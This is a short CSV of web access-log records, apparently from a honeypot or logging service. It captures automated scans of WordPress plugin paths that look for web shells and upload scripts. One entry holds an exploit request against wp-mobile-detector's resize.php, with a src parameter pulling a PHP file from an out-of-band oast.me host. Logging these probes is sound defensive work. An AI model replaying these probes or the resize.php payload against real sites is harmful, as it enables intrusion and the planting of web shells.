"ip","time","path","useragent","source"
"172.71.124.192","2026-05-04T00:22:37Z","/wp-content/plugins/inputs.php","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","plugin_php"
"104.22.66.16","2026-05-04T00:22:37Z","/wp-content/plugins/admin.php","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","plugin_php"
"172.69.176.74","2026-05-04T00:35:09Z","/wp-content/plugins/index.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.70.208.47","2026-05-04T00:51:56Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.163.227","2026-05-04T02:20:30Z","/wp-content/plugins/index.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.70.189.78","2026-05-04T02:29:31Z","/wp-content/plugins/about.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"162.158.189.134","2026-05-04T02:29:33Z","/wp-content/plugins/simple/simple.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"108.162.227.124","2026-05-04T02:37:37Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.108.157","2026-05-03T04:28:54Z","//wp-content/plugins/fix/up.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36","plugin_php"
"172.70.147.179","2026-05-03T05:09:07Z","/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15","plugin_php"
"104.22.66.16","2026-05-03T05:09:07Z","/wp-content/plugins/wp-mobile-detector/resize.php?src=http://d7qlhho1fd7tdm4vrc2gq9dbfcdpzucog.oast.me/aZBwFOay.php","Mozilla/5.0 (X11; Linux x86_64; rv:1.9.7.20) Gecko/ Firefox/3.6.7","plugin_php"
"172.70.92.192","2026-05-03T05:39:45Z","/wp-content/plugins/index.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"162.158.189.91","2026-05-03T06:14:46Z","/wp-content/plugins/","Mozilla/5.0 (compatible; WP-Safe-Scanner/1.0)","plugin_php"
"172.68.242.88","2026-05-03T06:50:48Z","//wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
